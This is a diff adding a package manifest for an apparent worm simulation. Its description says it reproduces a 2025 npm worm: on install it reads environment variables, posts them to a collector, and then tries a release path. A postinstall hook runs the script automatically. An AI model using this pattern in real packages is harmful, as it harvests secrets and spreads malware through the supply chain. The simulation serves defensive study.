@@ -1,0 +1,12 @@
+{
+  "name": "postinstall-shape",
+  "version": "1.0.0",
+  "private": true,
+  "description": "The shape of a 2025 npm worm, scope-limited to our own collector. Reads process.env on install, posts it, then tries the KLAXON release path.",
+  "type": "module",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  },
+  "files": ["index.js", "postinstall.js", "README.md"]
+}
